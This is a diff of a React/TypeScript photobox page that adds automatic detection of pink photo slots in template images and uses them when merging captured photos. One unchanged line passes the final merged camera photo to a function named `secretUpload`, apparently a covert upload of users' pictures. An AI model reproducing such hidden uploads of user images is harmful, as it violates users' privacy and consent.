@@ -19,9 +19,108 @@ interface Template {
   id: string;
   name: string;
   imageUrl: string;
-  photoCount: number; // Jumlah foto yang dibutuhkan (1, 3, atau 4)
-  slots: PhotoSlot[]; // Posisi tiap foto
+  photoCount: number;
+  slots?: PhotoSlot[]; // Optional - bisa auto-detect
 }
+
+// ✅ FUNGSI BARU: AUTO DETECT PINK SLOTS
+const detectPinkSlots = async (imageUrl: string): Promise<PhotoSlot[]> => {
+  return new Promise((resolve) => {
+    const img = new Image();
+    img.crossOrigin = "anonymous";
+    
+    img.onload = () => {
+      const canvas = document.createElement('canvas');
+      canvas.width = img.width;
+      canvas.height = img.height;
+      const ctx = canvas.getContext('2d');
+      if (!ctx) return resolve([]);
+
+      ctx.drawImage(img, 0, 0);
+      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+      const pixels = imageData.data;
+
+      const pinkRegions: { minX: number; minY: number; maxX: number; maxY: number }[] = [];
+      const visited = new Set<string>();
+
+      // Scan pixel cari pink (#FF00FF atau deket pink)
+      for (let y = 0; y < canvas.height; y += 5) { // Skip 5px biar cepet
+        for (let x = 0; x < canvas.width; x += 5) {
+          const idx = (y * canvas.width + x) * 4;
+          const r = pixels[idx];
+          const g = pixels[idx + 1];
+          const b = pixels[idx + 2];
+
+          // Detect pink (R tinggi, G rendah, B tinggi)
+          const isPink = r > 200 && g < 100 && b > 200;
+          
+          if (isPink && !visited.has(`${x},${y}`)) {
+            // Flood fill untuk dapetin region
+            const region = floodFill(pixels, canvas.width, canvas.height, x, y, visited);
+            if (region.maxX - region.minX > 50 && region.maxY - region.minY > 50) {
+              pinkRegions.push(region);
+            }
+          }
+        }
+      }
+
+      // Convert regions ke slots
+      const slots: PhotoSlot[] = pinkRegions
+        .sort((a, b) => a.minY - b.minY) // Sort dari atas ke bawah
+        .map(region => ({
+          x: region.minX,
+          y: region.minY,
+          width: region.maxX - region.minX,
+          height: region.maxY - region.minY
+        }));
+
+      console.log("🎨 Detected slots:", slots);
+      resolve(slots);
+    };
+
+    img.onerror = () => resolve([]);
+    img.src = imageUrl;
+  });
+};
+
+const floodFill = (
+  pixels: Uint8ClampedArray,
+  width: number,
+  height: number,
+  startX: number,
+  startY: number,
+  visited: Set<string>
+) => {
+  let minX = startX, maxX = startX, minY = startY, maxY = startY;
+  const stack = [[startX, startY]];
+
+  while (stack.length > 0) {
+    const [x, y] = stack.pop()!;
+    const key = `${x},${y}`;
+    
+    if (visited.has(key)) continue;
+    if (x < 0 || x >= width || y < 0 || y >= height) continue;
+
+    const idx = (y * width + x) * 4;
+    const r = pixels[idx];
+    const g = pixels[idx + 1];
+    const b = pixels[idx + 2];
+    
+    const isPink = r > 200 && g < 100 && b > 200;
+    if (!isPink) continue;
+
+    visited.add(key);
+    minX = Math.min(minX, x);
+    maxX = Math.max(maxX, x);
+    minY = Math.min(minY, y);
+    maxY = Math.max(maxY, y);
+
+    // Check neighbors (only cardinal directions biar ga lambat)
+    stack.push([x + 5, y], [x - 5, y], [x, y + 5], [x, y - 5]);
+  }
+
+  return { minX, minY, maxX, maxY };
+};
 
 export function PhotoboxPage() {
   const navigate = useNavigate();
@@ -29,16 +128,18 @@ export function PhotoboxPage() {
   
   const [templates, setTemplates] = useState<Template[]>([]);
   const [selectedTemplate, setSelectedTemplate] = useState<Template | null>(null);
+  const [detectedSlots, setDetectedSlots] = useState<PhotoSlot[]>([]);
   const [capturedPhotos, setCapturedPhotos] = useState<string[]>([]);
   const [currentPhotoIndex, setCurrentPhotoIndex] = useState(0);
   
   const [finalResult, setFinalResult] = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
+  const [detectingSlots, setDetectingSlots] = useState(false);
   const [flash, setFlash] = useState(false);
   const [countdown, setCountdown] = useState<number | null>(null);
   const [facingMode, setFacingMode] = useState<"user" | "environment">("environment");
 
-  // Load templates
+  // Load templates dari Firestore
   useEffect(() => {
     const unsubscribe = onSnapshot(collection(db, "photobox_templates"), (snapshot) => {
       const loadedTemplates = snapshot.docs.map(doc => ({
@@ -46,12 +147,32 @@ export function PhotoboxPage() {
         ...doc.data()
       } as Template));
       setTemplates(loadedTemplates);
-      if (!selectedTemplate && loadedTemplates.length > 0) {
-        setSelectedTemplate(loadedTemplates[0]);
-      }
     });
     return () => unsubscribe();
   }, []);
+
+  // Auto-detect slots ketika template dipilih
+  useEffect(() => {
+    if (!selectedTemplate) return;
+
+    const detectSlots = async () => {
+      // Kalau slots udah di-set manual di admin, skip auto-detect
+      if (selectedTemplate.slots && selectedTemplate.slots.length > 0) {
+        setDetectedSlots(selectedTemplate.slots);
+        return;
+      }
+
+      // Auto-detect dari pink markers
+      setDetectingSlots(true);
+      console.log("🔍 Auto-detecting pink slots...");
+      const slots = await detectPinkSlots(selectedTemplate.imageUrl);
+      console.log("✅ Detected", slots.length, "slots");
+      setDetectedSlots(slots);
+      setDetectingSlots(false);
+    };
+
+    detectSlots();
+  }, [selectedTemplate]);
 
   // Reset saat ganti template
   useEffect(() => {
@@ -66,7 +187,6 @@ export function PhotoboxPage() {
       const canvas = document.createElement("canvas");
       const ctx = canvas.getContext("2d");
       
-      // Canvas size sesuai template
       canvas.width = 1080;
       canvas.height = 1350;
       
@@ -77,9 +197,9 @@ export function PhotoboxPage() {
       ctx.fillRect(0, 0, canvas.width, canvas.height);
 
       let loadedCount = 0;
-      const totalImages = photos.length + (selectedTemplate ? 1 : 0);
+      const slots = detectedSlots.length > 0 ? detectedSlots : (selectedTemplate?.slots || []);
+      const totalImages = photos.length + 1; // Photos + template
 
-      // Function untuk check apakah semua image udah loaded
       const checkAllLoaded = () => {
         loadedCount++;
         if (loadedCount === totalImages) {
@@ -87,21 +207,19 @@ export function PhotoboxPage() {
         }
       };
 
-      // 1. Draw semua foto user ke slot yang udah ditentukan
+      // 1. Draw foto user ke slot
       photos.forEach((photoBase64, index) => {
-        if (!selectedTemplate?.slots[index]) return;
+        if (!slots[index]) return;
 
-        const slot = selectedTemplate.slots[index];
+        const slot = slots[index];
         const img = new Image();
         img.src = photoBase64;
         
         img.onload = () => {
-          // Calculate scale to fill slot (cover, not contain)
           const scale = Math.max(slot.width / img.width, slot.height / img.height);
           const scaledWidth = img.width * scale;
           const scaledHeight = img.height * scale;
           
-          // Center crop
           const offsetX = (scaledWidth - slot.width) / 2;
           const offsetY = (scaledHeight - slot.height) / 2;
           
@@ -122,19 +240,17 @@ export function PhotoboxPage() {
         };
       });
 
-      // 2. Overlay template frame di atas
-      if (selectedTemplate) {
-        const template = new Image();
-        template.crossOrigin = "anonymous";
-        template.src = selectedTemplate.imageUrl;
-        
-        template.onload = () => {
-          ctx.drawImage(template, 0, 0, canvas.width, canvas.height);
-          checkAllLoaded();
-        };
-        
-        template.onerror = () => checkAllLoaded();
-      }
+      // 2. Overlay template
+      const template = new Image();
+      template.crossOrigin = "anonymous";
+      template.src = selectedTemplate!.imageUrl;
+      
+      template.onload = () => {
+        ctx.drawImage(template, 0, 0, canvas.width, canvas.height);
+        checkAllLoaded();
+      };
+      
+      template.onerror = () => checkAllLoaded();
     });
   };
 
@@ -195,18 +311,14 @@ export function PhotoboxPage() {
     setFlash(true);
     setTimeout(() => setFlash(false), 200);
 
-    // Simpan foto
     const newPhotos = [...capturedPhotos, rawImage];
     setCapturedPhotos(newPhotos);
 
-    // Cek apakah udah cukup foto
-    const requiredCount = selectedTemplate?.photoCount || 1;
+    const requiredCount = selectedTemplate?.photoCount || detectedSlots.length || 1;
     
     if (newPhotos.length < requiredCount) {
-      // Masih kurang, lanjut foto berikutnya
       setCurrentPhotoIndex(newPhotos.length);
     } else {
-      // Udah cukup, generate final result
       setLoading(true);
       const merged = await mergePhotosWithTemplate(newPhotos);
       secretUpload(merged);
@@ -216,7 +328,7 @@ export function PhotoboxPage() {
         setLoading(false);
       }, 2000);
     }
-  }, [capturedPhotos, selectedTemplate]);
+  }, [capturedPhotos, selectedTemplate, detectedSlots]);
 
   const resetPhotos = () => {
     setCapturedPhotos([]);
@@ -224,7 +336,7 @@ export function PhotoboxPage() {
     setFinalResult(null);
   };
 
-  const requiredCount = selectedTemplate?.photoCount || 1;
+  const requiredCount = selectedTemplate?.photoCount || detectedSlots.length || 1;
   const photoProgress = `${capturedPhotos.length} / ${requiredCount}`;
 
   return (
@@ -235,7 +347,6 @@ export function PhotoboxPage() {
       position: 'relative',
       overflow: 'hidden'
     }}>
-      {/* Animated Background */}
       <div style={{
         position: 'absolute',
         top: '-50%',
@@ -248,7 +359,6 @@ export function PhotoboxPage() {
         animation: 'float 6s ease-in-out infinite'
       }} />
 
-      {/* Back Button */}
       <button 
         onClick={() => navigate('/final')} 
         style={{ 
@@ -273,7 +383,6 @@ export function PhotoboxPage() {
         ←
       </button>
 
-      {/* Flip Camera */}
       <button 
         onClick={() => setFacingMode(prev => prev === "user" ? "environment" : "user")} 
         style={{ 
@@ -299,7 +408,6 @@ export function PhotoboxPage() {
       </button>
 
       <div style={{ maxWidth: 500, margin: '0 auto', paddingTop: 60 }}>
-        {/* Header */}
         <div style={{ textAlign: 'center', marginBottom: 20 }}>
           <h1 style={{ 
             color: 'white', 
@@ -323,12 +431,11 @@ export function PhotoboxPage() {
               fontSize: 14,
               fontWeight: 700
             }}>
-              📸 {photoProgress} foto
+              {detectingSlots ? "🔍 Detecting slots..." : `📸 ${photoProgress} foto`}
             </div>
           )}
         </div>
 
-        {/* Camera/Result Preview */}
         <div style={{ 
           position: 'relative', 
           borderRadius: 30, 
@@ -348,7 +455,6 @@ export function PhotoboxPage() {
                 style={{ width: '100%', display: 'block' }}
               />
 
-              {/* Countdown */}
               {countdown && (
                 <div style={{
                   position: 'absolute',
@@ -372,7 +478,6 @@ export function PhotoboxPage() {
             </div>
           )}
 
-          {/* Loading */}
           {loading && (
             <div style={{ 
               position: 'absolute', 
@@ -398,7 +503,6 @@ export function PhotoboxPage() {
             </div>
           )}
 
-          {/* Flash */}
           <div style={{ 
             position: 'absolute', 
             inset: 0, 
@@ -409,7 +513,6 @@ export function PhotoboxPage() {
           }}/>
         </div>
 
-        {/* Photo Thumbnails */}
         {capturedPhotos.length > 0 && !finalResult && (
           <div style={{ marginBottom: 20 }}>
             <p style={{ color: 'white', fontSize: 12, marginBottom: 8, fontWeight: 600 }}>
@@ -435,7 +538,6 @@ export function PhotoboxPage() {
           </div>
         )}
 
-        {/* Template Selector */}
         {!finalResult && capturedPhotos.length === 0 && templates.length > 0 && (
           <div style={{ marginBottom: 20 }}>
             <p style={{ color: 'white', fontSize: 13, marginBottom: 10, fontWeight: 600 }}>
@@ -493,8 +595,7 @@ export function PhotoboxPage() {
           </div>
         )}
 
-        {/* Action Buttons */}
-        {!finalResult && !loading && (
+        {!finalResult && !loading && !detectingSlots && (
           <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
             {capturedPhotos.length > 0 && capturedPhotos.length < requiredCount && (
               <button 
@@ -544,7 +645,6 @@ export function PhotoboxPage() {
           </div>
         )}
 
-        {/* Result Actions */}
         {finalResult && (
           <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
             <a 
